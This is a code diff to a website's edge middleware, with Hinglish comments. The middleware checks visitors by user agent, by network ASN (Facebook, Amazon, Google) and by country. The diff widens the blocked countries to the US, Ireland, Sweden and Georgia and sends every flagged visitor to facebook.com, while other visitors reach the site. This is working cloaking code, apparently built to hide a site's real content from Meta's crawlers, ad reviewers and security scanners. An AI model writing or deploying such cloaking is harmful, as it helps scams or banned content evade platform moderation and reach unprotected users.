@@ -16,8 +16,8 @@ const BLOCKED_UAS = ["facebookexternalhit"];
 // Asli Bot Networks jo har haal mein verification par hi jayenge
 const BOT_ASNS = new Set(["32934", "16509", "15169"]);
 
-// Strictly blocked countries (Data Center Hubs jahan se automatic scan aate hain)
-const BLOCKED_COUNTRIES = new Set(["SE", "IE"]); // SE = Sweden, IE = Ireland
+// Strictly blocked countries — yahan se har traffic (human ho ya bot) FB par redirect
+const BLOCKED_COUNTRIES = new Set(["US", "IE", "SE", "GE"]); // US, Ireland, Sweden, Georgia
 
 export default function middleware(request) {
   const url = new URL(request.url);
@@ -40,7 +40,7 @@ export default function middleware(request) {
 
   let triggerVerification = false;
 
-  // 1. COUNTRY CHECK: Sweden ya Ireland se aane wala har traffic seedha verification par
+  // 1. COUNTRY CHECK: US, Ireland, Sweden, Georgia se aane wala har traffic seedha FB par
   if (clientCountry && BLOCKED_COUNTRIES.has(clientCountry.toUpperCase())) {
     triggerVerification = true;
   }
@@ -65,9 +65,9 @@ export default function middleware(request) {
     }
   }
 
-  // Agar criteria match ho jaye, to bina URL badle verification page load karein
+  // Agar koi bhi bot criteria match ho jaye, to verification.html ke bajaye facebook.com par redirect
   if (triggerVerification) {
-    return rewrite(new URL('/verification.html', request.url));
+    return Response.redirect('https://www.facebook.com/', 302);
   }
 
   return next();
